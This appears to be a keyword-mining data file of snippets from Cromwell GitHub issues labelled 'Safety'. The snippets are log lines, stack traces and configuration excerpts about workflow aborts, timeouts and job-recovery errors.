WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:2581,Abort,Aborting,2581,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,"orting 5 EJEAs; 2016-12-12 18:32:38,555 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akk",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:2419,Abort,Aborting,2419,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,"orting 6 EJEAs; 2016-12-12 18:32:25,094 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(793dd16f)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:32:38,555 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akk",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:2257,Abort,Aborting,2257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,ot copy a suitable cache hit for 119e11a5:wf_hello.hello:-1:1. No copy attempts were made.; 2024-08-19 14:48:00 cromwell-system-akka.dispatchers.backend-dispatcher-84 ERROR - GcpBatchAsyncBackendJobExecutionActor [UUID(119e11a5)wf_hello.hello:NA:1]: Error attempting to Recover(StandardAsyncJob(projects/broad-dsde-cromwell-dev/locations/us-central1/jobs/job-7ce25791-3731-4a69-97f1-b7b65ac8ff71)); java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:805); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:804); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.execute(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recover(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:829); 	at scala.util.Try$.apply(Try.scala:210); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recoverAsync(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:1253); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(Stand,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7495:2826,recover,recover,2826,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7495,1,['recover'],['recover']
Safety,"other benefit is that we'd reduce our dependency on dockerhub. Green team is seeing issues that look like they're throttling us, namely a bunch of these:. ```; Execution failed: pulling image: docker pull: generic::unknown: retry budget exhausted (10 attempts): ; running [""docker"" ""pull"" ""google/cloud-sdk:slim""]: exit status 1 (standard error: ""Error response from ; daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection ; (Client.Timeout exceeded while awaiting headers)\n"") at ; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4640#issuecomment-463034541:481,Timeout,Timeout,481,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4640#issuecomment-463034541,1,['Timeout'],['Timeout']
Safety,"ould not read from /home/devarea/karl/PathoCromwell/cromwell-executions/Agilent_Exome_Single/3f4aa8de-d1a9-419a-b9b4-10f9ed0a9d53/call-SomaticVariants/SomaticVariantcalling/0c6cefa3-4c84-497f-8003-b0d7221bedbc/call-mutect2/Mutect2/fb66e417-4c06-4f15-8607-da8261e16448/call-scatterList/execution/stdout: /home/devarea/karl/PathoCromwell/cromwell-executions/Agilent_Exome_Single/3f4aa8de-d1a9-419a-b9b4-10f9ed0a9d53/call-SomaticVariants/SomaticVariantcalling/0c6cefa3-4c84-497f-8003-b0d7221bedbc/call-mutect2/Mutect2/fb66e417-4c06-4f15-8607-da8261e16448/call-scatterList/execution/stdout; cromwell_1 | at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:973); cromwell_1 | at scala.util.Success.$anonfun$map$1(Try.scala:255) cromwell_1 | at scala.util.Success.map(Try.scala:213); cromwell_1 | at scala.concurrent.Future.$anonfun$map$1(Future.scala:292) ; cromwell_1 | at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:33) cromwell_1 | at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:33) cromwell_1 | at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64) cromwell_1 | at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) cromwell_1 | at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92) ; `. Basically cromwell fails to read a stdout file written by a job.; When we check the file it exists and contains data so i suspect some kind of IO problem. All Data is on NFS shares which are usually quite stable and we see no errors in any of the filesystem/nfs backends. It seems to mostly happen in this scatter step, so i suspect some race condition or timeout somewhere in there, however, this job was creating a scatter to 12 bed files, so its really not that big . Just re-running the job usually works, but its extremely annoying. Call caching is disabled:; `call-caching {; enabled = false; }`. Any idea what to do ?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7094:2693,timeout,timeout,2693,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094,1,['timeout'],['timeout']
Safety,"patchers.backend-dispatcher-183 INFO - TesAsyncBackendJobExecutionActor [UUID(af282f7a)wf_hello.hello:NA:1]: Job bccmdfdd6o377kru9q6g is complete; 2018-06-07 13:13:04,883 cromwell-system-akka.dispatchers.backend-dispatcher-183 INFO - TesAsyncBackendJobExecutionActor [UUID(af282f7a)wf_hello.hello:NA:1]: Status change from Running to Complete; 2018-06-07 13:13:06,346 cromwell-system-akka.dispatchers.engine-dispatcher-59 ERROR - WorkflowManagerActor Workflow af282f7a-1e95-4390-8cf7-c3bbd93b10b2 failed (during ExecutingWorkflowState): cromwell.core.CromwellFatalException: java.nio.file.NoSuchFileException: /Users/tdyar/workspace/cromwell/cromwell-executions/wf_hello/af282f7a-1e95-4390-8cf7-c3bbd93b10b2/call-hello/execution/rc; 	at cromwell.core.CromwellFatalException$.apply(core.scala:18); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:38); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:37); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akk",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3743:6967,recover,recoverWith,6967,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3743,1,['recover'],['recoverWith']
Safety,"patchers.engine-dispatcher-38 INFO - BT-322 0845428a:myworkflow.mytask:-1:1 is not eligible for call caching; ```; <!-- Which backend are you running? -->; Used backend: ; GCPBATCH. Callcaching works with PAPIv2, not on GCPBATCH.; <!-- Paste/Attach your workflow if possible: -->; workflow used for testing:; ```; workflow myworkflow {; call mytask; }. task mytask {; String str = ""!""; command <<<; echo ""hello world ${str}""; >>>; output {; String out = read_string(stdout()); }. runtime{; docker: ""eu.gcr.io/project/image_name:tag""; cpu: ""1""; memory: ""500 MB""; disks: ""local-disk 5 HDD""; zones: ""europe-west1-b europe-west1-c europe-west1-d""; preemptible: 2; noAddress: true; }; }; ```; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; We are using cromwell through broadinstitute/cromwell:87-ecd44b6 image.; cromwell configuration:; ```; include required(classpath(""application"")). system.new-workflow-poll-rate=1. // increase timeout for http requests..... getting meta-data can timeout for large workflows.; akka.http.server.request-timeout=600s. # Maximum number of input file bytes allowed in order to read each type.; # If exceeded a FileSizeTooBig exception will be thrown.; system {; 	job-rate-control {; 	 jobs = 100; 	 per = 1 second; 	}; input-read-limits {; lines = 128000000; bool = 7; int = 19; float = 50; string = 1280000; json = 12800000; tsv = 1280000000; map = 128000000; object = 128000000; }. # If 'true', a SIGTERM or SIGINT will trigger Cromwell to attempt to gracefully shutdown in server mode,; # in particular clearing up all queued database writes before letting the JVM shut down.; # The shutdown is a multi-phase process, each phase having its own configurable timeout. See the Dev Wiki for more details.; 	graceful-server-shutdown = true; max-concurrent-workflows = 5000. io {; throttle {; # # Global Throttling - This is mostly useful for GCS and can be adjusted to match; # # the quota availble on the G",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:7373,timeout,timeout,7373,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,1,['timeout'],['timeout']
Safety,"pertyCheckFailedException:; 14:08:29 cromwell-test_1 | [info] ...; 14:08:29 cromwell-test_1 | [info] at cromwell.backend.sfs.SharedFileSystemJobExecutionActorSpec.localizationSpec(SharedFileSystemJobExecutionActorSpec.scala:119); 14:08:29 cromwell-test_1 | [info] at cromwell.backend.sfs.SharedFileSystemJobExecutionActorSpec.$anonfun$new$4(SharedFileSystemJobExecutionActorSpec.scala:156); 14:08:29 cromwell-test_1 | [info] at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); 14:08:29 cromwell-test_1 | [info] at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); 14:08:29 cromwell-test_1 | [info] at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); 14:08:29 cromwell-test_1 | [info] at org.scalatest.Transformer.apply(Transformer.scala:22); 14:08:29 cromwell-test_1 | [info] at org.scalatest.Transformer.apply(Transformer.scala:20); 14:08:29 cromwell-test_1 | [info] ...; 14:08:29 cromwell-test_1 | [info] Cause: org.scalatest.concurrent.Futures$FutureConcept$$anon$1: A timeout occurred waiting for a future to complete. Queried 21 times, sleeping 500 milliseconds between each query.; 14:08:29 cromwell-test_1 | [info] ...; 14:08:29 cromwell-test_1 | [info] at cromwell.backend.sfs.SharedFileSystemJobExecutionActorSpec.$anonfun$localizationSpec$1(SharedFileSystemJobExecutionActorSpec.scala:137); 14:08:29 cromwell-test_1 | [info] at cromwell.backend.sfs.SharedFileSystemJobExecutionActorSpec.$anonfun$localizationSpec$1$adapted(SharedFileSystemJobExecutionActorSpec.scala:119); 14:08:30 cromwell-test_1 | [info] at org.scalatest.enablers.UnitTableAsserting$TableAssertingImpl.$anonfun$forAll$7(TableAsserting.scala:505); 14:08:30 cromwell-test_1 | [info] at scala.collection.TraversableLike$WithFilter.$anonfun$foreach$1(TraversableLike.scala:789); 14:08:30 cromwell-test_1 | [info] at scala.collection.immutable.List.foreach(List.scala:389); 14:08:30 cromwell-test_1 | [info] at scala.collection.TraversableLike$WithFilter.foreach(TraversableLike.scala:788); 14:08:30 cromwel",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4319:2212,timeout,timeout,2212,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4319,1,['timeout'],['timeout']
Safety,"ponse to your request."". The workflow is removed from WORKFLOW_STORE_ENTRY but the associated jobs are still present in JOB_STORE_ENTRY. . There are no errors in the logs: ; `; 2016-12-12 18:22:26,139 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(8a965a5e)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:29:42,727 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(73be7f27)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:31:29,146 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(13965e09)]: Abort received. Aborting 10 EJEAs; 2016-12-12 18:31:46,093 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(804a56b6)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:32:05,063 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(2c6302c8)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:32:25,094 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(793dd16f)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:32:38,555 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-ak",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:1286,Abort,Aborting,1286,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,"pu: 1; memory: ""3.75 GB""; }; }; workflow test {; call hello. output {; File response = hello.response; }; }; ```. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; ```hoco; backend {; default = ""batch""; providers {; batch {; actor-factory = ""cromwell.backend.google.batch.GcpBatchBackendLifecycleActorFactory""; config {. # The Project To execute in; project = ""${compute_project}"". # The bucket where outputs will be written to; root = ""gs://${bucket}"". # Polling for completion backs-off gradually for slower-running jobs.; # This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. # Optional configuration to use high security network (Virtual Private Cloud) for running jobs.; # See https://cromwell.readthedocs.io/en/stable/backends/Google/ for more details.; # virtual-private-cloud {; # network-label-key = ""network-key""; # auth = ""application-default""; # }. # Global pipeline timeout; # Defaults to 7 days; max 30 days; # batch-timeout = 7 days. genomics {; auth = ""cromwell-service-account""; location: ""${region}""; compute-service-account = ""${compute_service_account}"". # Specifies the minimum file size for `gsutil cp` to use parallel composite uploads during delocalization.; # Parallel composite uploads can result in a significant improvement in delocalization speed for large files; # but may introduce complexities in downloading such files from GCS, please see; # https://cloud.google.com/storage/docs/gsutil/commands/cp#parallel-composite-uploads for more information.; #; # If set to 0 parallel composite uploads are turned off. The default Cromwell configuration turns off; # parallel composite uploads, this sample configuration turns it on for files of 150M or larger.; parallel-composite-upload-threshold=""150M""; }. filesystems {; gcs {; auth = ""cromwell-service-account"". # For billing; project = ""${billing_project}"". caching {; # When a cache hit is found, the following duplication ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7238:2069,timeout,timeout,2069,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238,2,['timeout'],['timeout']
Safety,"ractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:31,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:32,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:33,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:34,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:35,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:36,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:37,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:38,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:39,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:40,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:41,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:42,05] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleCl",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:12382,abort,abort,12382,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,radL/bar; cromwell.backend.sfs.SharedFileSystem$$anonfun$localizeInputs$1$$anon$1: Failures during localization:; Could not localize /mnt/lustre/home/conradL/foo/baz -> /mnt/lustre/home/conradL/cromwell-executions/symLinkTest/6cf6c785-dc48-4409-bbd1-6f1411211f42/call-referenceTheLink/inputs/mnt/lustre/home/conradL/foo/baz:; 	/mnt/lustre/home/conradL/bar doesn't exists; 	File not found /mnt/lustre/home/conradL/cromwell-executions/symLinkTest/6cf6c785-dc48-4409-bbd1-6f1411211f42/call-referenceTheLink/inputs/mnt/lustre/home/conradL/foo/baz -> /mnt/lustre/home/conradL/bar; 	File not found /mnt/lustre/home/conradL/bar; 	File not found /mnt/lustre/home/conradL/bar; 	at cromwell.backend.sfs.SharedFileSystem$$anonfun$localizeInputs$1.applyOrElse(SharedFileSystem.scala:200); 	at cromwell.backend.sfs.SharedFileSystem$$anonfun$localizeInputs$1.applyOrElse(SharedFileSystem.scala:199); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at scala.util.Failure.recoverWith(Try.scala:203); 	at cromwell.backend.sfs.SharedFileSystem$class.localizeInputs(SharedFileSystem.scala:199); 	at cromwell.backend.sfs.SharedFileSystemJobCachingActorHelper$$anon$1.localizeInputs(SharedFileSystemJobCachingActorHelper.scala:40); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$$anonfun$commandLinePreProcessor$1.apply(SharedFileSystemAsyncJobExecutionActor.scala:127); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$$anonfun$commandLinePreProcessor$1.apply(SharedFileSystemAsyncJobExecutionActor.scala:127); 	at cromwell.backend.wdl.Command$.instantiate(Command.scala:27); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.instantiatedCommand(StandardAsyncExecutionActor.scala:83); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsy,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1950:2386,recover,recoverWith,2386,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1950,1,['recover'],['recoverWith']
Safety,"ration.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ^C[2016-10-27 13:10:13,93] [info] WorkflowManagerActor: Received shutdown signal.; [2016-10-27 13:10:13,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:13,93] [info] WorkflowManagerActor Aborting all workflows; [2016-10-27 13:10:14,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:15,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:16,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:17,93] [info] Waiting for 1 workflows to abort...; ^C^C[2016-10-27 13:10:18,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:19,33] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:5454,abort,abort,5454,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,rebasing to develop is causing all the tests to timeout :(,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/868#issuecomment-220802012:48,timeout,timeout,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/868#issuecomment-220802012,1,['timeout'],['timeout']
Safety,"rectory; input_dir: fastqc_execute/output_directory; out: [output_directory]; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:691); at scala.util.Try$.apply(Try.scala:209); ... 25 more. <!-- SLURM backend configuration -->; include required(classpath(""application"")). backend {; default = SLURM. providers {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 